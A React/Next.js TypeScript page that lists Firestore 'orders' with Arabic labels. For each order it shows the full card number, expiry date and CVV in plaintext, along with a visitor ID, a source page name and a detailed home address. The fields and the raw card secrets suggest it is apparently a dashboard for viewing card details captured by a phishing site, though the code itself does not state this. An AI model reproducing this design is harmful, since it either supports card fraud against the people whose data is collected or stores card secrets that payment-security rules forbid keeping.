import { useState, useEffect, Key } from "react"
import { collection, onSnapshot, query, where } from "firebase/firestore"
import { useRouter } from "next/router"
import { auth, db } from "../lib/firebase"
import { useAuthState } from "react-firebase-hooks/auth"

export interface Payment {
  method?: string
  status?: string
  values?: {
    cardNumber?: string
    expiryDate?: string
    cvv?: string
  }
}

export interface Shipping {
  fullName?: string
  phone?: string
  governorate?: string
  area?: string
  block?: string
  house?: string
  street?: string
}

export interface OrderData {
  id: Key | null | undefined
  createdAt?: Date
  pageName?: string
  payment?: Payment
  shipping?: Shipping
  visitor?: string
}

const initialOrders: OrderData[] = []

const Orders = () => {
  const [user, loading, error] = useAuthState(auth)
  const [orders, setOrders] = useState<OrderData[]>(initialOrders)
  const router = useRouter()

  useEffect(() => {
    if (loading) return
    if (!user) {
      router.push("/login")
      return
    }

    const q = query(collection(db, "orders"), where("uid", "==", user.uid))
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const newOrders = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      })) as OrderData[]
      setOrders(newOrders)
    })
    return () => unsubscribe()
  }, [user, router])

  return (
    <div className="container mx-auto p-4">
      {orders.map((order) => (
        <div key={order.id} className="bg-white shadow-md rounded-lg p-6 mb-4">
          {/* Basic Information */}
          <div>
            <h3 className="text-gray-400 mb-2">معلومات أساسية</h3>
            <div className="space-y-2">
              <p>تاريخ الإنشاء: {order.createdAt ? new Date(order.createdAt).toLocaleString("ar-SA") : "غير متوفر"}</p>
              <p>الصفحة: {order.pageName ?? "غير متوفر"}</p>
              <p>رقم الزائر: {order.visitor ?? "غير متوفر"}</p>
            </div>
          </div>

          {/* Payment Information */}
          <div>
            <h3 className="text-gray-400 mb-2">معلومات الدفع</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <p>طريقة الدفع: {order.payment?.method ?? "غير متوفر"}</p>
                <p>حالة الدفع: {order.payment?.status ?? "غير متوفر"}</p>
              </div>
              <div className="space-y-2">
                <p>رقم البطاقة: {order.payment?.values?.cardNumber ?? "غير متوفر"}</p>
                <p>تاريخ الانتهاء: {order.payment?.values?.expiryDate ?? "غير متوفر"}</p>
                <p>CVV: {order.payment?.values?.cvv ?? "غير متوفر"}</p>
              </div>
            </div>
          </div>

          {/* Shipping Information */}
          <div>
            <h3 className="text-gray-400 mb-2">معلومات الشحن</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <p>الاسم الكامل: {order.shipping?.fullName ?? "غير متوفر"}</p>
                <p>رقم الهاتف: {order.shipping?.phone ?? "غير متوفر"}</p>
                <p>المحافظة: {order.shipping?.governorate ?? "غير متوفر"}</p>
              </div>
              <div className="space-y-2">
                <p>المنطقة: {order.shipping?.area ?? "غير متوفر"}</p>
                <p>القطعة: {order.shipping?.block ?? "غير متوفر"}</p>
                <p>المنزل: {order.shipping?.house ?? "غير متوفر"}</p>
                <p>الشارع: {order.shipping?.street ?? "غير متوفر"}</p>
              </div>
            </div>
          </div>
        </div>
      ))}
    </div>
  )
}

export default Orders

